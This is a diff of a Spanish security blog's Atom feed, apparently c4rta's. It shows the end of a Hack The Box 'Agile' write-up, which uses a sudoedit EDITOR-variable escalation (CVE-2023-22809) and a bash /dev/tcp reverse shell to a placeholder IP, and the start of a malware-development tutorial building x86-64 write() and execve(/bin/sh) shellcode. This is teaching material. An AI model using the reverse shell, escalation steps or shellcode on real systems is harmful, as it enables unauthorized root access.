-&lt;p&gt;Si usamos &lt;code class=&quot;highlighter-rouge&quot;&gt;sudo -l&lt;/code&gt; veremos que podemos ejecutar como &lt;code class=&quot;highlighter-rouge&quot;&gt;dev_admin&lt;/code&gt; el comando &lt;code class=&quot;highlighter-rouge&quot;&gt;sudoedit&lt;/code&gt; sobre dos archivos&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;edwards@agile:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; password &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;edwards: 
-Matching Defaults entries &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;edwards on agile:
-    env_reset, mail_badpass, &lt;span class=&quot;nv&quot;&gt;secure_path&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr/local/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/local/bin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/bin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/bin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/snap/bin, use_pty
-
-User edwards may run the following commands on agile:
-    &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;dev_admin : dev_admin&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; sudoedit /app/config_test.json
-    &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;dev_admin : dev_admin&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; sudoedit /app/app-testing/tests/functional/creds.txt
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Al buscar en google una posible via de escalacion con sudoedit, encontre esto:&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;
-    &lt;p&gt;&lt;a href=&quot;https://exploit-notes.hdks.org/exploitlinux/privilege-escalation/sudo/sudoedit-privilege-escalation/&quot;&gt;https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudoedit-privilege-escalation/&lt;/a&gt;&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;&lt;a href=&quot;https://www.synacktiv.com/sites/default/files/2023-01/sudo-CVE-2023-22809.pdf&quot;&gt;https://www.synacktiv.com/sites/default/files/2023-01/sudo-CVE-2023-22809.pdf&lt;/a&gt;&lt;/p&gt;
-  &lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;Vemos que nos permite convertirnos en root mediante la variable de entorno &lt;code class=&quot;highlighter-rouge&quot;&gt;EDITOR&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;Primero exportamos la variable de entorno EDITOR con este valor:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;export &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;EDITOR&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'vim -- /app/venv/bin/activate'&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Y es con ese valor por que al mostrar los archivos que pertenecen el grupo dev_admin, tenemos el &lt;code class=&quot;highlighter-rouge&quot;&gt;activate&lt;/code&gt;:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;edwards@agile:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;find / &lt;span class=&quot;nt&quot;&gt;-group&lt;/span&gt; dev_admin 2&amp;gt;/dev/null
-/home/dev_admin
-/app/venv
-/app/venv/bin
-/app/venv/bin/activate
-/app/venv/bin/Activate.ps1
-/app/venv/bin/activate.fish
-/app/venv/bin/activate.csh
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Despues editamos el archivo &lt;code class=&quot;highlighter-rouge&quot;&gt;config_test.json&lt;/code&gt;&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; dev_admin sudoedit /app/config_test.json
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Y al principio agregamos una reverse shell:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bash &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&amp;amp; /dev/tcp/&amp;lt;tu_IP&amp;gt;/443 0&amp;gt;&amp;amp;1
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;De esta manera&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/img/agile/12.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Despues guardamos y salimos y unos segundos despues nos llegara una conexion como root&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/img/agile/11.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Eso ha sido todo, gracias por leer ❤&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/img/agile/waifu.gif&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;</content><author><name>c4rta</name></author><category term="HTB" /><category term="LFI" /><category term="IDOR" /><summary>Tenemos un sitio web que sirve como vaul de contraseñas donde descubriremos que es vulnerable a LFI a la hora de exportar las contraseñas, ese mismo LFI lo aprovecharemos para filtrar un archivo de la aplicacion mediante un error de incluir una ruta que no existe, despues mediante IDOR vamos a poder ver las credenciales del usuario corum, despues haremos port forwarding para traernos un puerto y descubriremos el mismo sitio web donde obtendremos las credenciales de edwards, y para la escalada nos aprovecharemos de una vulnerabilidad de sudoedit mediante la variable de entorno EDITOR</summary></entry><entry><title>Shellcode almacenada en el heap e inyección vía APC injection y NtTestAlert en un proceso local</title><link href="http://localhost:4000/heap-queueUserApc/" rel="alternate" type="text/html" title="Shellcode almacenada en el heap e inyección vía APC injection y NtTestAlert en un proceso local" /><published>2023-07-17T00:00:00-06:00</published><updated>2023-07-17T00:00:00-06:00</updated><id>http://localhost:4000/heap-queueUserApc</id><content type="html" xml:base="http://localhost:4000/heap-queueUserApc/">&lt;p&gt;Esta vez vamos a almacenar la shellcode en el heap de un proceso local usando HeapCrate y HeapAlloc y la ejecutaremos con QueueUserAPC y la NTAPI indocumentada NtTestAlert&lt;/p&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom"><generator uri="http://jekyllrb.com" version="3.6.3">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2023-07-25T22:28:57-06:00</updated><id>http://localhost:4000/</id><title>c4rta</title><subtitle>Un chico que le gusta la informatica</subtitle><entry><title>Shellcode almacenada en el heap e inyección vía APC injection y NtTestAlert en un proceso local</title><link href="http://localhost:4000/heap-queueUserApc/" rel="alternate" type="text/html" title="Shellcode almacenada en el heap e inyección vía APC injection y NtTestAlert en un proceso local" /><published>2023-07-17T00:00:00-06:00</published><updated>2023-07-17T00:00:00-06:00</updated><id>http://localhost:4000/heap-queueUserApc</id><content type="html" xml:base="http://localhost:4000/heap-queueUserApc/">&lt;p&gt;Esta vez vamos a almacenar la shellcode en el heap de un proceso local usando HeapCrate y HeapAlloc y la ejecutaremos con QueueUserAPC y la NTAPI indocumentada NtTestAlert&lt;/p&gt;
 
 &lt;h2 id=&quot;asynchronous-procedure-calls-apc-y-queueuserapc&quot;&gt;Asynchronous Procedure Calls (APC) y QueueUserAPC()&lt;/h2&gt;
 
@@ -2760,4 +2374,248 @@ le&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
 
 &lt;p&gt;Eso ha sido todo, gracias por leer ❤&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;/assets/img/mmap_injection/waifu.gif&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;</content><author><name>c4rta</name></author><category term="MalDev" /><summary>Desarrollaremos un programa en C el cual inyectara una shellcode usando la syscall mmap()</summary></entry></feed>
+&lt;p&gt;&lt;img src=&quot;/assets/img/mmap_injection/waifu.gif&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;</content><author><name>c4rta</name></author><category term="MalDev" /><summary>Desarrollaremos un programa en C el cual inyectara una shellcode usando la syscall mmap()</summary></entry><entry><title>Shellcodes - syscall write() y execve(bin/sh)</title><link href="http://localhost:4000/maldev-shellcodes/" rel="alternate" type="text/html" title="Shellcodes - syscall write() y execve(bin/sh)" /><published>2023-06-07T00:00:00-06:00</published><updated>2023-06-07T00:00:00-06:00</updated><id>http://localhost:4000/maldev-shellcodes</id><content type="html" xml:base="http://localhost:4000/maldev-shellcodes/">&lt;p class=&quot;lead&quot;&gt;Veremos a como puedes crear shellcodes, te enseñare como crear una usando la syscall write() y otra usando execve() para ejecutar bin/sh&lt;/p&gt;
+
+&lt;h2 id=&quot;shellcodes&quot;&gt;Shellcodes&lt;/h2&gt;
+
+&lt;p&gt;Las shellcodes son un conjunto de instrucciones de bajo nivel (ensamblador) que se inyectan en la memoria de un programa con el fin de ejecutar codigo&lt;/p&gt;
+
+&lt;p&gt;Actualemente son usadas ampliamente para ejecutar codigo malicioso, de hecho, si alguna vez explotaste un buffer overflow stack-based, estoy seguro de que las usaste al menos un vez, por otra parte, tambien son muy usadas en el desarrollo de malware, ya que hay muchas tecnicas diferentes para inyectarlas, al fin de cuenta, con las shellcodes puedes ejecutar casi cualquier cosa o cualquier cosa, y esto es gracias a la syscalls&lt;/p&gt;
+
+&lt;h2 id=&quot;syscalls&quot;&gt;Syscalls&lt;/h2&gt;
+
+&lt;p&gt;Las syscalls son metodos establecidos por el sistema operativo para decirle al kernel que realice una tarea, por ejemplo, tenemos este codigo:&lt;/p&gt;
+
+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;stdio.h&amp;gt;
+&lt;/span&gt;
+&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;ola&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Es muy simple, de hecho, podemos decir que nomas tiene 3 intrucciones, el &lt;code class=&quot;highlighter-rouge&quot;&gt;include&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;printf&lt;/code&gt; y el &lt;code class=&quot;highlighter-rouge&quot;&gt;void main()&lt;/code&gt;. pero la cantidad de syscalls que hace es increible, usaremos el comando &lt;code class=&quot;highlighter-rouge&quot;&gt;strace&lt;/code&gt; para interceptar y registrar todas las syscalls que hace nuestro binario: &lt;code class=&quot;highlighter-rouge&quot;&gt;strace ./binario&lt;/code&gt;, y esto arroja:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;execve(&quot;./prueba&quot;, [&quot;./prueba&quot;], 0x7ffc3236ede0 /* 57 vars */) = 0
+brk(NULL)                               = 0x5555f3c59000
+arch_prctl(0x3001 /* ARCH_??? */, 0x7ffe25dc3f10) = -1 EINVAL (Invalid argument)
+access(&quot;/etc/ld.so.preload&quot;, R_OK)      = -1 ENOENT (No such file or directory)
+openat(AT_FDCWD, &quot;/etc/ld.so.cache&quot;, O_RDONLY|O_CLOEXEC) = 3
+newfstatat(3, &quot;&quot;, {st_mode=S_IFREG|0644, st_size=167079, ...}, AT_EMPTY_PATH) = 0
+mmap(NULL, 167079, PROT_READ, MAP_PRIVATE, 3, 0) = 0x7fde591cf000
+close(3)                                = 0
+openat(AT_FDCWD, &quot;/usr/lib/libc.so.6&quot;, O_RDONLY|O_CLOEXEC) = 3
+read(3, &quot;\177ELF\2\1\1\3\0\0\0\0\0\0\0\0\3\0&amp;gt;\0\1\0\0\0\20:\2\0\0\0\0\0&quot;..., 832) = 832
+pread64(3, &quot;\6\0\0\0\4\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0&quot;..., 784, 64) = 784
+newfstatat(3, &quot;&quot;, {st_mode=S_IFREG|0755, st_size=1961632, ...}, AT_EMPTY_PATH) = 0
+mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7fde591cd000
+pread64(3, &quot;\6\0\0\0\4\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0&quot;..., 784, 64) = 784
+mmap(NULL, 2006640, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x7fde58fe3000
+mmap(0x7fde59005000, 1429504, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x22000) = 0x7fde59005000
+mmap(0x7fde59162000, 360448, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x17f000) = 0x7fde59162000
+mmap(0x7fde591ba000, 24576, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x1d6000) = 0x7fde591ba000
+mmap(0x7fde591c0000, 52848, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x7fde591c0000
+close(3)                                = 0
+mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7fde58fe1000
+arch_prctl(ARCH_SET_FS, 0x7fde591ce640) = 0
+set_tid_address(0x7fde591ce910)         = 60068
+set_robust_list(0x7fde591ce920, 24)     = 0
+rseq(0x7fde591cef60, 0x20, 0, 0x53053053) = 0
+mprotect(0x7fde591ba000, 16384, PROT_READ) = 0
+mprotect(0x5555f2670000, 4096, PROT_READ) = 0
+mprotect(0x7fde59229000, 8192, PROT_READ) = 0
+prlimit64(0, RLIMIT_STACK, NULL, {rlim_cur=8192*1024, rlim_max=RLIM64_INFINITY}) = 0
+munmap(0x7fde591cf000, 167079)          = 0
+newfstatat(1, &quot;&quot;, {st_mode=S_IFCHR|0620, st_rdev=makedev(0x88, 0x1), ...}, AT_EMPTY_PATH) = 0
+getrandom(&quot;\x52\x39\x5a\x38\x9f\x83\x1b\x9e&quot;, 8, GRND_NONBLOCK) = 8
+brk(NULL)                               = 0x5555f3c59000
+brk(0x5555f3c7a000)                     = 0x5555f3c7a000
+write(1, &quot;ola\n&quot;, 4ola
+)                    = 4
+exit_group(4)                           = ?
++++ exited with 4 +++
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Todas estas syscalls es lo que hace nuestro simple binario por detras, y nosotros no vemos este funcionamiento, solo vemos que imprime la cadena ola.&lt;/p&gt;
+
+&lt;p&gt;A lo que quiero llegar es que muchas de las instrucciones que hacemos en los lenguajes de programacion, tienen una syscall asociada, ya sea C, Python, Rust, Golang, etc, y es importante conocer las syscalls, por que cuando se desarrollan shellcodes, se llaman directamente a las sycalls tomando en cuenta su estructura.&lt;/p&gt;
+
+&lt;p&gt;Para llamar a syscalls desde lenguaje ensamblador se toman en cuenta las calling conventions, asi que para llamar a uns syscall se hace de esta forma &lt;code class=&quot;highlighter-rouge&quot;&gt;syscall(rdi,rsi,rdx,r10,r8,r9)&lt;/code&gt;, recuerda que los primeros 6 argumentos se pasan por los registos rdi,rsi,rdx,r10,r8,r9, y lo demas se pasa por el stack&lt;/p&gt;
+
+&lt;h2 id=&quot;shellcode-usando-write&quot;&gt;Shellcode usando write()&lt;/h2&gt;
+
+&lt;p&gt;Esta syscall es usada para imprimir algo por la salida estandar (stdout), tiene la estructura:&lt;/p&gt;
+
+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;ssize_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;int fd: Es el descriptor de archivos donde se va a escribir, se puede establecer como 1(stdout), 2(sdterr), o cualquier otro descriptor que se abrio&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;void *buf: Es un puntero al buffer desde donde se empezaran a leer los datos&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;size_t count: Es el numero de bytes que se van a escribir&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Ahora toca programiar en ensamblador:&lt;/p&gt;
+
+&lt;p&gt;Primeramente vamos a definir el inicio de nuestro programa, y lo hare de esta manera:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;section .text
+        global _start:
+
+_start:
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Con &lt;code class=&quot;highlighter-rouge&quot;&gt;section .text&lt;/code&gt; le estoy diciendo que las instrucciones que le siguen, o apartir de ese punto, se van a almacenar en la seccion &lt;code class=&quot;highlighter-rouge&quot;&gt;.text&lt;/code&gt;, y eso es asi, por que esa seccion contiene las instrucciones que se van a ejecutar.&lt;/p&gt;
+
+&lt;p&gt;Con &lt;code class=&quot;highlighter-rouge&quot;&gt;global _start&lt;/code&gt; le estoy diciendo que exporte los simbolos a partir de &lt;code class=&quot;highlighter-rouge&quot;&gt;_start&lt;/code&gt;, para que sean visiable desde fuera del archivo, y se hace con el fin de que puedan ser leidos por el enlazador (ld).&lt;/p&gt;
+
+&lt;p&gt;Y dentro de &lt;code class=&quot;highlighter-rouge&quot;&gt;_start&lt;/code&gt; va todo nuestro codigo, y el programa completo se veria asi:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;section .text
+        global _start:
+
+_start:
+        mov rax, 1
+        mov rsi, 0x616e757a614e
+        push rsi
+        mov rsi, rsp
+        mov rdx, 6
+        syscall  
+        mov rax, 60
+        syscall
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;Con &lt;code class=&quot;highlighter-rouge&quot;&gt;mov rax, 1&lt;/code&gt; estamos copiando el numero 1, al registro &lt;code class=&quot;highlighter-rouge&quot;&gt;rax&lt;/code&gt;, es 1, por que la syscall write esta asociada a ese numero en GNU/Linux&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;mov rsi, 0x616e757a614e&lt;/code&gt; le estamos diciendo que copie el valor que queremos mostrar (0x616e757a614e), al registro &lt;code class=&quot;highlighter-rouge&quot;&gt;rsi&lt;/code&gt;, y en este caso, &lt;code class=&quot;highlighter-rouge&quot;&gt;rsi&lt;/code&gt; va a funcionar como puntero al valor que se va a escribir&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;push rsi&lt;/code&gt; Esta poniendo el registro &lt;code class=&quot;highlighter-rouge&quot;&gt;rsi&lt;/code&gt; en el stack, con el fin de que la syscall pueda acceder a lo que queremos imprimir&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;mov rsi, rsp&lt;/code&gt; Aqui le indicamos que copie la direccion del &lt;code class=&quot;highlighter-rouge&quot;&gt;rsp&lt;/code&gt; al registro &lt;code class=&quot;highlighter-rouge&quot;&gt;rsi&lt;/code&gt;, y ahora si, &lt;code class=&quot;highlighter-rouge&quot;&gt;rsi&lt;/code&gt; apunta al valor que vamos a imprimir el cual esta en el stack&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;mov rdx, 6&lt;/code&gt; Le estamos indicando el tamaño en bytes de lo que se va a mostrar, asi que copia el tamaño de 6 bytes al registro rdx&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;syscall&lt;/code&gt; se hace el llamado a write&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Las ultima dos instrucciones se hace el llamado a la syscall exit para que todo termine correctamente&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;strong&gt;Ojo&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;Te podras dar cuenta que no se usa el registro rdi, que para write, es usado para el descriptor de archivos, y diras: “Como es posible eso, si en la estructura de write se debe de establecer el registro rdi en 1, de hecho y &lt;a href=&quot;https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md#x86_64-64_bit&quot;&gt;aca&lt;/a&gt; lo dice”. Y pues no necesariamente, por que el descriptor de archivos ya tiene establecido por defecto el valor 1 para stdout.&lt;/p&gt;
+
+&lt;p&gt;Ahora procedemos a compilar: &lt;code class=&quot;highlighter-rouge&quot;&gt;nasm -f elf64 shellcode.asm&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Esto nos dejara un archivo .o el cual debemos de enlazar: &lt;code class=&quot;highlighter-rouge&quot;&gt;ld -m elf_x86_64 -s -o write shellcode.o&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Estos dos comandos nos dejo un binario elf, el cual si ejecutamos, se ejecutara la syscall write, y mostrara el texto:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/shellcode/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Y a toda madre, funciona, pero eso no es una shellcode, es un binario elf, y si lo vemos en un editor hexadecimal podemos ver la shellcode en hexadecimal&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/shellcode/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Asi que para pasarla a un byte array, que seria la forma en la que se inyectan, primero usaremos&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;objcopy -j .text -O binary shellcode.o write.bin&lt;/code&gt; para generar un archivo .bin&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;hexdump -v -e '&quot;\\&quot; 1/1 &quot;x%02x&quot;' write.bin; echo&lt;/code&gt; para imprimir el byte array&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Y ahora si, esto si es una shellcode a como estamos acostumbrados a verlas:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;\xb8\x01\x00\x00\x00\x48\xbe\x4e\x61\x7a\x75\x6e\x61\x00\x00\x56\x48\x89\xe6\xba\x06\x00\x00\x00\x0f\x05\xb8\x3c\x00\x00\x00\x0f\x05
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;shellcode-para-conseguir-una-shell&quot;&gt;Shellcode para conseguir una shell&lt;/h2&gt;
+
+&lt;p&gt;Ahora usaremos execve para poder ejecutar /bin/sh, y que consigamos una shell, el codigo es el siguiente:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;section .text
+    global _start
+
+_start:
+
+    xor rdx, rdx
+    push rdx
+    mov rax, 0x68732f2f6e69622f
+    push rax
+    mov rdi, rsp
+    push rdx
+    push rdi
+    mov rsi, rsp
+    xor rax, rax
+    mov al, 0x3b
+    syscall
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Explicare directamente lo que esta dentro de &lt;code class=&quot;highlighter-rouge&quot;&gt;_start&lt;/code&gt; por que lo demas ya saben que hace&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;xor rdx, rdx&lt;/code&gt; El registo &lt;code class=&quot;highlighter-rouge&quot;&gt;rdx&lt;/code&gt; haciendo una operacion XORing consigo mismo, esto es para que el registro este limpio antes de usarlo, es buena practica nomas, si se le quita no pasa nada&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;push rdx&lt;/code&gt; Metemos un null bye al stack para indicar el final de la cadena que se le pasara como argumento a execve&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;mov rax, 0x68732f2f6e69622f&lt;/code&gt; Copiamos /bin/sh al registro rax (la cadena esta en hex)&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;push rax&lt;/code&gt; Metemos &lt;code class=&quot;highlighter-rouge&quot;&gt;rax&lt;/code&gt; al stack para que pueda ser accedida por el &lt;code class=&quot;highlighter-rouge&quot;&gt;rsp&lt;/code&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;mov rdi, rsp&lt;/code&gt; Copiamos la direccion de /bin/sh en &lt;code class=&quot;highlighter-rouge&quot;&gt;rdi&lt;/code&gt;, la cual sera el primer argumento de execve, en ese momento el &lt;code class=&quot;highlighter-rouge&quot;&gt;rsp&lt;/code&gt; apunta a la direccion de /bin/sh&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;push rdx&lt;/code&gt; Metemos otro byte nulo al stack&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;push rdi&lt;/code&gt; Metemos la direccion de /bin/sh en el stack&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
